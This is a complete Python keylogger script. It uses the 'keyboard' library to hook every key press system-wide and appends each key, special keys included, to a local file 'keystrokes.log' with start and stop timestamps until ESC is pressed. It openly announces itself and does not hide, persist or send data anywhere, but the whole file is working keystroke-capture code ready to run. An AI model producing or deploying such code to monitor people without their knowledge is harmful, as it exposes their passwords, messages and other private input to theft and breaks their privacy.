import keyboard
from datetime import datetime
import os

def on_key_press(event):
    """Callback function for key press events"""
    key = event.name

    # Handle special keys
    if len(key) > 1:
        if key == "space":
            key = " "
        elif key == "enter":
            key = "[ENTER]"
        elif key == "decimal":
            key = "."
        else:
            key = f"[{key.upper()}]"
    
    # Write to log file, each key on a new line
    with open("keystrokes.log", "a", encoding="utf-8") as log_file:
        log_file.write(f"{key}\n")

def main():
    # Create log file if it doesn't exist
    if not os.path.exists("keystrokes.log"):
        with open("keystrokes.log", "w", encoding="utf-8") as log_file:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_file.write(f"Keylogger started at {timestamp}\n\n")
    
    print("Keylogger started. Press ESC to stop.")
    keyboard.on_press(on_key_press)

    # Wait for ESC key to stop
    keyboard.wait("esc")
    
    # Add closing timestamp
    with open("keystrokes.log", "a", encoding="utf-8") as log_file:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_file.write(f"\nKeylogger stopped at {timestamp}\n")
    
    print("Keylogger stopped. Keystrokes saved to keystrokes.log")

if __name__ == "__main__":
    main()
